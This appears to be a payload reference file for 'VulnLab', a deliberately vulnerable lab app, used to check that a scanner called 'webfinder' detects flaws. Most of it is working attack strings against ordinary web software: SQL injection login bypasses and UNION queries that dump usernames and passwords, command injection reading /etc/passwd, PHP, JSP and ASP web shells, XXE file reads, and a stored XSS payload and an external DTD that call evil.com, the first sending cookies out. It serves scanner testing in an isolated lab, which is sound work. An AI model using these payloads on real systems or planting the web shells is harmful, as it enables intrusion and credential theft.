# VulnLab - Sample Exploits for Testing
# Use these payloads to test your webfinder tool

## SQL Injection Payloads

### Login Form (/login)
# Basic bypass
admin'--
' OR '1'='1
' OR 1=1--

# Union attacks  
' UNION SELECT 1,username,password,email,role FROM users--
' UNION SELECT 1,2,3,4,sqlite_version()--

# Time-based blind
admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 AND SLEEP(5)--

### Search Function (/search)
test' UNION SELECT id,username,password,email FROM users--
test' OR 1=1--

## Cross-Site Scripting (XSS) Payloads

### Reflected XSS (Search)
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')

### Stored XSS (Posts)
<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>
<iframe src=javascript:alert('Stored XSS')>
<body onload=alert('XSS')>

## Directory Traversal Payloads

### File Download (/download?file=)
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
../app.py
../../../../vulnlab.db

## Command Injection Payloads

### Ping Tool (/ping)
google.com; ls -la
google.com && whoami
google.com | cat /etc/passwd
; cat app.py
$(cat /etc/passwd)
`whoami`

## File Upload Exploits

### Malicious Files to Upload
# PHP Web Shell
<?php system($_GET['cmd']); ?>

# JSP Web Shell  
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
%>

# ASP Web Shell
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

## XXE Payloads

### Contact Form XML API
# Basic XXE
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
  <name>&xxe;</name>
  <email>test@example.com</email>
  <message>XXE Test</message>
</contact>

# XXE with external DTD
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>
<contact>
  <name>Test</name>
  <email>test@example.com</email>
  <message>&evil;</message>
</contact>

## IDOR (Insecure Direct Object Reference) Tests

### Profile Access (/profile?id=)
# Try accessing other users' profiles
/profile?id=1
/profile?id=2
/profile?id=999

## CSRF Exploits

### State Changing Operations
# Try accessing these URLs directly or via GET requests
# Should normally require POST and CSRF tokens

## API Security Tests

### Unauthenticated API Access
GET /api/users
GET /api/users/1
GET /api/users/2

# Look for sensitive data exposure in API responses

## Authentication Bypass Tests

### Weak Credentials
admin:password123
admin:admin
testuser:test123

### Session Management
# Check for weak session tokens
# Test session fixation
# Test concurrent sessions

## Error-Based Information Disclosure

### Database Errors
# Trigger SQL errors to reveal database structure
' AND 1=CONVERT(int, (SELECT @@version))--

### Application Errors  
# Test with malformed inputs to trigger stack traces
# Check error messages for sensitive information

## Business Logic Vulnerabilities

### Access Control
# Access admin functions as regular user
# Try accessing /admin without proper authentication

### Parameter Tampering
# Modify user IDs in forms
# Change role parameters if present

## SSL/TLS Testing

### Check for:
- Weak SSL versions (SSLv2, SSLv3)
- Weak ciphers
- Missing HSTS headers
- Certificate issues

## Security Headers Testing

### Missing Headers to Look For:
- X-Frame-Options
- X-XSS-Protection  
- X-Content-Type-Options
- Content-Security-Policy
- Strict-Transport-Security

## Notes for Testing

1. Always test with proper authorization
2. Use VulnLab only in isolated environments  
3. Document all findings properly
4. Verify exploits work as expected
5. Test both automated and manual techniques

## Expected Vulnerabilities in VulnLab:

✓ SQL Injection (Login, Search)
✓ Cross-Site Scripting (Stored, Reflected)
✓ Directory Traversal (File Download)
✓ File Upload (No restrictions)
✓ Command Injection (Ping tool)
✓ XXE (Contact form)
✓ IDOR (Profile access)
✓ Information Disclosure (API, errors)
✓ Weak Authentication (Default creds)
✓ Missing Access Controls (Admin panel)
✓ CSRF (No tokens)
✓ Sensitive Data Exposure (Password hashes)

Use these payloads to verify your webfinder tool detects vulnerabilities correctly!